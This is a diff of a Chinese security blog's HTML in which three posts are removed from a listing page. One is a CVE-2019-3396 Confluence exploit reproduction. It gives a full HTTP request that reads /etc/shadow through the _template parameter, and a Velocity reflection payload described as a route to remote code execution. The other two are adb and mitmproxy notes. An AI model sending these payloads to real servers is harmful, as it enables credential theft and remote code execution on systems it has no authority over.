-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/" itemprop="url">CVE-2019-3396：confluence任意文件读取与RCE漏洞复现</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T19:20:18+08:00">
-                2019-04-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href>cve-2019-3396</a></p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: confluence.xxxxxx.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Referer: http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: xxxxxxx</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 176</span><br><span class="line"></span><br><span class="line">&#123;"contentId":"655594","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"file:///etc/shadow”&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>通过template参数中使用file协议可以读取服务器上的任意文件</p>
-<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e="e")</span><br><span class="line">$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString()</span><br></pre></td></tr></table></figure></p>
-<p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/安卓模拟器相关/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/08/安卓模拟器相关/" itemprop="url">安卓模拟器相关</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T17:43:21+08:00">
-                2019-04-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/移动安全攻防/" itemprop="url" rel="index">
-                    <span itemprop="name"> 移动安全攻防</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="安卓模拟器杂七杂八的记录"><a href="#安卓模拟器杂七杂八的记录" class="headerlink" title="安卓模拟器杂七杂八的记录"></a>安卓模拟器杂七杂八的记录</h2><h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><h4 id="adb基本操作"><a href="#adb基本操作" class="headerlink" title="adb基本操作"></a>adb基本操作</h4><p>可以参考mumu模拟器官方的文档，蛮详细的<a href>adb常规操作</a></p>
-<h4 id="app备份"><a href="#app备份" class="headerlink" title="app备份"></a>app备份</h4><p>adb backup -f “D:\myfolder\myapp.ab” -apk \<package name\><br>adb restore “D:\myfolder\myapp.ab”</package></p>
-<h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/MITMPROXY的摘要/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/03/MITMPROXY的摘要/" itemprop="url">MITMPROXY的摘要</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:40:30+08:00">
-                2019-04-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/爬虫/" itemprop="url" rel="index">
-                    <span itemprop="name">爬虫</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="MITMPROXY基本介绍"><a href="#MITMPROXY基本介绍" class="headerlink" title="MITMPROXY基本介绍"></a>MITMPROXY基本介绍</h1><p>没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb</p>
-<h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>Mitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。</p>
-<ul>
-<li>貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。</li>
-<li>支持通过正则配置替换规则来对内容进行替换</li>
-<li>支持过滤，过滤语法参考<a href="https://docs.mitmproxy.org/stable/concepts-filters/" title="mitmproxy filter" target="_blank" rel="noopener">mitmproxy filter</a></li>
-<li>似乎支持TCP代理，但是不能对TCP流进行修改</li>
-<li>支持websocket</li>
-<li>支持socks proxy</li>
-<li>支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考<a href="https://docs.mitmproxy.org/stable/howto-transparent/" title="mitmproxy透明模式" target="_blank" rel="noopener">mitmproxy透明模式</a><h2 id="mitmdump"><a href="#mitmdump" class="headerlink" title="mitmdump"></a>mitmdump</h2>Mitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。<br>关于脚本编写的一些案例可以参考<a href="https://docs.mitmproxy.org/stable/addons-scripting/" title="mitmproxy-scripting" target="_blank" rel="noopener">mitmproxy-scripting</a><h2 id="mitmweb"><a href="#mitmweb" class="headerlink" title="mitmweb"></a>mitmweb</h2>mitmproxy的web版本<br>没有更多想说的</li>
-</ul>
-<h1 id="其他重点记录"><a href="#其他重点记录" class="headerlink" title="其他重点记录"></a>其他重点记录</h1><p>暂无</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1900,7 +1856,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1911,7 +1867,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -1922,7 +1878,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -1980,7 +1936,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
